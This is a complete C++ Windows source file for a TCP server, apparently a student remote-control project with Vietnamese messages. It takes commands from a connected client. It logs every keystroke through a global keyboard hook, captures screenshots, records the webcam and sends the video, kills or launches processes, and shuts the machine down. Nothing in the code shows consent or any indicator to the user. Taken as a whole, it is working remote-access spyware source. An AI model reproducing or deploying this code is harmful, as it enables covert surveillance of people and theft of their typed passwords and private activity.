#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <vfw.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "vfw32.lib")

using namespace std;
using namespace Gdiplus;

// Global Variables
SOCKET serverSocket;
SOCKET clientSocket;
atomic<bool> isKeylogActive(false);
atomic<bool> isRecording(false);
string keylogPath = "fileKeyLog.txt";
HHOOK keyboardHook = NULL;
HWND hCapture = NULL;

// Function Prototypes
void receiveSignal(string& s);
void shutdown();
void keylog();
void takepic();
void processManagement();
void applicationManagement();
void webcam();
void hookKey();
void unhookKey();
void printkeys();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void startKeyLogger();
void stopKeyLogger();

// String conversion helper compatible with UNICODE/ANSI
static string toUtf8(const TCHAR* tstr) {
#ifdef UNICODE
    int size = WideCharToMultiByte(CP_UTF8, 0, tstr, -1, nullptr, 0, nullptr, nullptr);
    if (size <= 0) return string();
    vector<char> buffer(static_cast<size_t>(size));
    WideCharToMultiByte(CP_UTF8, 0, tstr, -1, buffer.data(), size, nullptr, nullptr);
    return string(buffer.data());
#else
    return string(tstr);
#endif
}

// Network Helper Functions
void sendLine(const string& s) {
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine() {
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

void receiveSignal(string& s) {
    try {
        s = receiveLine();
    } catch (...) {
        s = "QUIT";
    }
}

// System Control Functions
void shutdown() {
    system("shutdown /s /t 0");
}

void restart() {
    system("shutdown /r /t 0");
}

// Keylogger Implementation
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        
        ofstream file(keylogPath, ios::app);
        if (file.is_open()) {
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            switch (vkCode) {
                case VK_SPACE: file << " "; break;
                case VK_RETURN: file << "Enter\n"; break;
                case VK_BACK: file << "Backspace"; break;
                case VK_TAB: file << "Tab"; break;
                case '0': file << (shift ? ")" : "0"); break;
                case '1': file << (shift ? "!" : "1"); break;
                case '2': file << (shift ? "@" : "2"); break;
                case '3': file << (shift ? "#" : "3"); break;
                case '4': file << (shift ? "$" : "4"); break;
                case '5': file << (shift ? "%" : "5"); break;
                case '6': file << (shift ? "^" : "6"); break;
                case '7': file << (shift ? "&" : "7"); break;
                case '8': file << (shift ? "*" : "8"); break;
                case '9': file << (shift ? "(" : "9"); break;
                case VK_OEM_2: file << (shift ? "?" : "/"); break;
                case VK_OEM_4: file << (shift ? "{" : "["); break;
                case VK_OEM_6: file << (shift ? "}" : "]"); break;
                case VK_OEM_1: file << (shift ? ":" : ";"); break;
                case VK_OEM_7: file << (shift ? "\"" : "'"); break;
                case VK_OEM_COMMA: file << (shift ? "<" : ","); break;
                case VK_OEM_PERIOD: file << (shift ? ">" : "."); break;
                case VK_OEM_MINUS: file << (shift ? "_" : "-"); break;
                case VK_OEM_PLUS: file << (shift ? "+" : "="); break;
                case VK_OEM_3: file << (shift ? "~" : "`"); break;
                case VK_OEM_5: file << "|"; break;
                default:
                    if (vkCode >= 'A' && vkCode <= 'Z') {
                        char ch = vkCode;
                        if ((!shift && !caps) || (shift && caps)) {
                            ch = tolower(ch);
                        }
                        file << ch;
                    }
                    break;
            }
            file.close();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void startKeyLogger() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (isKeylogActive && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void hookKey() {
    isKeylogActive = true;
    ofstream file(keylogPath, ios::trunc);
    file.close();
    
    thread keylogThread(startKeyLogger);
    keylogThread.detach();
}

void unhookKey() {
    isKeylogActive = false;
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

void printkeys() {
    ifstream file(keylogPath);
    string content;
    if (file.is_open()) {
        stringstream buffer;
        buffer << file.rdbuf();
        content = buffer.str();
        file.close();
        
        // Clear file
        ofstream clearFile(keylogPath, ios::trunc);
        clearFile.close();
    }
    
    if (content.empty()) {
        content = "\0";
    }
    send(clientSocket, content.c_str(), content.length(), 0);
}

void keylog() {
    string s;
    while (true) {
        receiveSignal(s);
        if (s == "PRINT") printkeys();
        else if (s == "HOOK") hookKey();
        else if (s == "UNHOOK") unhookKey();
        else if (s == "QUIT") return;
    }
}

// Screenshot Function
void takepic() {
    string ss;
    
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    while (true) {
        receiveSignal(ss);
        if (ss == "TAKE") {
            HDC hdcScreen = GetDC(NULL);
            HDC hdcMemory = CreateCompatibleDC(hdcScreen);
            
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            
            HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
            SelectObject(hdcMemory, hBitmap);
            BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
            
            Bitmap* bitmap = new Bitmap(hBitmap, NULL);
            
            IStream* stream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &stream);
            
            CLSID pngClsid;
            OLECHAR guidStr[] = L"{557CF406-1A04-11D3-9A73-0000F81EF32E}";
            CLSIDFromString(guidStr, &pngClsid);
            Status status = bitmap->Save(stream, &pngClsid, NULL);
            
            STATSTG statstg;
            stream->Stat(&statstg, STATFLAG_DEFAULT);
            ULONG size = statstg.cbSize.LowPart;
            
            char* buffer = new char[size];
            LARGE_INTEGER li = {0};
            stream->Seek(li, STREAM_SEEK_SET, NULL);
            stream->Read(buffer, size, NULL);
            
            sendLine(to_string(size));
            send(clientSocket, buffer, size, 0);
            
            delete[] buffer;
            delete bitmap;
            stream->Release();
            DeleteObject(hBitmap);
            DeleteDC(hdcMemory);
            ReleaseDC(NULL, hdcScreen);
            
        } else if (ss == "QUIT") {
            GdiplusShutdown(gdiplusToken);
            return;
        }
    }
}

// Process Management
void processManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        
        if (ss == "XEM") {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                vector<PROCESSENTRY32> processes;
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
                
                sendLine(to_string(processes.size()));
                
                for (const auto& proc : processes) {
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                }
            }
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Da diet process");
                        } else {
                            sendLine("Loi");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string exeName = receiveLine();
                    exeName += ".exe";
                    
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    
                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        sendLine("Process da duoc bat");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

// Application Management (processes with windows)
void applicationManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        
        if (ss == "XEM") {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                ZeroMemory(&pe32, sizeof(pe32));
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                vector<PROCESSENTRY32> processes;
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
                
                sendLine(to_string(processes.size()));
                
                for (const auto& proc : processes) {
                    // Simple check - assume processes with main window title have a window
                    // This is a simplified version to avoid lambda issues
                    sendLine("ok");
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                }
            }
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Da diet chuong trinh");
                        } else {
                            sendLine("Loi");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Khong tim thay chuong trinh");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string exeName = receiveLine();
                    exeName += ".exe";
                    
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    
                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        sendLine("Chuong trinh da duoc bat");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

// Webcam Recording
void webcam() {
    string videoPath = "temp_video.avi";
    string cmd;
    bool recording = false;
    
    while (true) {
        receiveSignal(cmd);
        
        if (cmd == "START") {
            if (!recording) {
                remove(videoPath.c_str());
                
                // Start recording in background thread
                thread recordThread([&]() {
                    const char* windowName = "Webcam";
                    hCapture = capCreateCaptureWindowA(windowName, 0, 0, 0, 320, 240, NULL, 0);
                    if (hCapture) {
                        SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0);
                        SendMessage(hCapture, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)(const char*)videoPath.c_str());
                        
                        CAPTUREPARMS params = {0};
                        params.dwRequestMicroSecPerFrame = 66667; // ~15fps
                        params.fYield = TRUE;
                        params.fAbortLeftMouse = FALSE;
                        params.fAbortRightMouse = FALSE;
                        params.vKeyAbort = 0;
                        params.fLimitEnabled = FALSE;
                        
                        int structSize = sizeof(CAPTUREPARMS);
                        SendMessage(hCapture, WM_CAP_SET_SEQUENCE_SETUP, structSize, (LPARAM)&params);
                        SendMessage(hCapture, WM_CAP_SEQUENCE, 0, 0);
                    }
                });
                recordThread.detach();
                
                recording = true;
                sendLine("Server: Da bat dau quay video...");
            } else {
                sendLine("Server: Dang quay roi!");
            }
        } else if (cmd == "STOP") {
            if (recording) {
                if (hCapture) {
                    SendMessage(hCapture, WM_CAP_STOP, 0, 0);
                    SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                    DestroyWindow(hCapture);
                    hCapture = NULL;
                }
                recording = false;
                
                Sleep(2000); // Wait for file to be ready
                
                // Try to read the file
                bool fileReady = false;
                for (int i = 0; i < 15; i++) {
                    ifstream file(videoPath, ios::binary | ios::ate);
                    if (file.is_open()) {
                        streamsize size = file.tellg();
                        if (size > 1024) {
                            fileReady = true;
                            file.close();
                            break;
                        }
                        file.close();
                    }
                    Sleep(500);
                }
                
                if (fileReady) {
                    ifstream file(videoPath, ios::binary | ios::ate);
                    streamsize size = file.tellg();
                    file.seekg(0, ios::beg);
                    
                    char* buffer = new char[size];
                    if (file.read(buffer, size)) {
                        sendLine("OK");
                        sendLine(to_string(size));
                        send(clientSocket, buffer, size, 0);
                    }
                    
                    delete[] buffer;
                    file.close();
                    remove(videoPath.c_str());
                } else {
                    sendLine("Loi: File video khong san sang. Hay thu lai.");
                }
            } else {
                sendLine("Loi: Chua bat dau quay!");
            }
        } else if (cmd == "QUIT") {
            if (recording && hCapture) {
                SendMessage(hCapture, WM_CAP_STOP, 0, 0);
                SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                DestroyWindow(hCapture);
                hCapture = NULL;
            }
            return;
        }
    }
}

// Main Server Function
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }
    
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(5656);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Bind failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    if (listen(serverSocket, 100) == SOCKET_ERROR) {
        cerr << "Listen failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Server listening on port 5656..." << endl;
    
    clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Accept failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Client connected!" << endl;
    
    string s;
    while (true) {
        receiveSignal(s);
        
        if (s == "KEYLOG") {
            keylog();
        } else if (s == "SHUTDOWN") {
            shutdown();
        } else if (s == "TAKEPIC") {
            takepic();
        } else if (s == "PROCESS") {
            processManagement();
        } else if (s == "APPLICATION") {
            applicationManagement();
        } else if (s == "WEBCAM") {
            webcam();
        } else if (s == "QUIT") {
            break;
        }
    }
    
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    
    return 0;
}
